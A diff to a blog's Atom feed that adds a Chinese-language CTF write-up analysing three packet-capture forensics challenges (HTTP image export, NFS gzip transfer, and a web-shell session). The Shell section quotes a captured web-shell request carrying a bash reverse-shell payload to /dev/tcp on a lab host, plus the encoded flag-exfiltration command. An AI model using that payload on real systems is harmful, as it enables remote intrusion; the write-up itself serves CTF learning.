@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://purewhitywhite.github.io/"/>
-  <updated>2020-03-14T15:01:17.721Z</updated>
+  <updated>2020-03-15T15:37:22.493Z</updated>
   <id>https://purewhitywhite.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Stage1Day8 Misc</title>
+    <link href="https://purewhitywhite.github.io/2020-03-15/Stage1Day8-Misc/"/>
+    <id>https://purewhitywhite.github.io/2020-03-15/Stage1Day8-Misc/</id>
+    <published>2020-03-15T12:52:46.000Z</published>
+    <updated>2020-03-15T15:37:22.493Z</updated>
+    
+    <content type="html"><![CDATA[<p>Blue-whale OJ<br>Forensics1、Forensics2、Shell writeup.</p><a id="more"></a><h1 id="Forensics1"><a href="#Forensics1" class="headerlink" title="Forensics1"></a>Forensics1</h1><p>根据提示过滤http流量：<br><center><img src="https://s1.ax1x.com/2020/03/15/88hx4H.jpg" alt="88hx4H.jpg" border="0"></center><br>跟踪http流，可知请求与返回的大概流程：<code>打开网页→获取ico→三次输入密码→进入secretpage→获取s3cret.png</code><br>于是将s3cret.png导出分组字节流→修改后缀名为图片格式→获得flag<br><center><img src="https://s1.ax1x.com/2020/03/15/884TIg.jpg" alt="884TIg.jpg" border="0"></center></p><h1 id="Forensics2"><a href="#Forensics2" class="headerlink" title="Forensics2"></a>Forensics2</h1><h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h2><ul><li><p><code>NFS</code>实现了一个跨越网络的文件访问功能，其整个架构为Client-Server架构，客户端和服务端通过<code>RPC</code>协议进行通信，<code>RPC</code>协议可以简单的理解为一个基于TCP的应用层协议，它简化命令和数据的传输。</p><center><img src="https://pic2.zhimg.com/80/v2-796db5ba77a921c6e143553d47cdc251_720w.jpg"></center></li><li><p><code>Mount</code>: 从客户端的角度来说，NFS中的第一个操作称为 mount，Mount 代表将远程文件系统加载到本地文件系统空间中。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>根据题目的hint，优先考虑与文件相关的<code>NFS</code>协议。过滤NFS流量，一番观察后可以看到flag.txt.gz：</p><center><img src="https://s1.ax1x.com/2020/03/15/880NIf.jpg" alt="880NIf.jpg" border="0"></center>继续向下看，双方大概进行了一番认证和目录的搜索，然后就到了用户向服务器写入数据的部分了：<center><img src="https://s1.ax1x.com/2020/03/15/88BjA0.jpg" alt="88BjA0.jpg" border="0"></center></li></ul><p>查看数据包的详细内容，注意到<code>contents</code>部分很有可能含有flag（不过是乱码）：<br><center><a href="https://imgchr.com/i/88DRv4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/15/88DRv4.jpg" alt="88DRv4.jpg" border="0"></a></center><br>注意到这是个压缩文件，于是将其以压缩文件的形式解码，得到flag：<br><img src="https://s1.ax1x.com/2020/03/15/886bTA.jpg" alt="886bTA.jpg" border="0"></p><h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><p>先看http流量，url为<code>http://192.168.247.130/shell.php?cmd=bash -c &#39;bash -i &gt; /dev/tcp/192.168.247.128/12345 &lt;&amp;1 2&gt;&amp;1&#39;]</code><br>貌似是建立了一个<a href="https://www.cnblogs.com/bmjoker/p/9035217.html" title="反弹shell" target="_blank" rel="noopener">反弹shell</a>，跟踪tcp流量就可看到行为：<br><center><img src="https://s1.ax1x.com/2020/03/15/88Rs91.md.jpg" alt="88Rs91.jpg" border="0"></center></p><p>对于<code>www-data@UbuntuServer16:/tmp/flag$ cat flag.txt | base64 -w 0 | python -c &quot;print raw_input().swapcase()&quot;</code>，再结合下面返回的<code>zMXHz3TYzxzLCNnLx3nOzwWXBdfSBgWXBh0k</code>，说明这就是flag里的内容，不过经过base64编码后再<code>swapcase</code>大小写互换，那么写脚本再改变大小写之后base64解码可得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">code = <span class="string">"zMXHz3TYzxzLCNnLx3nOzwWXBdfSBgWXBh0k"</span></span><br><span class="line">flag = base64.b64decode(code.swapcase())</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Blue-whale OJ&lt;br&gt;Forensics1、Forensics2、Shell writeup.&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
+    
+      <category term="Misc" scheme="https://purewhitywhite.github.io/tags/Misc/"/>
+    
+  </entry>
   
   <entry>
     <title>Stage1Day7 pwn</title>
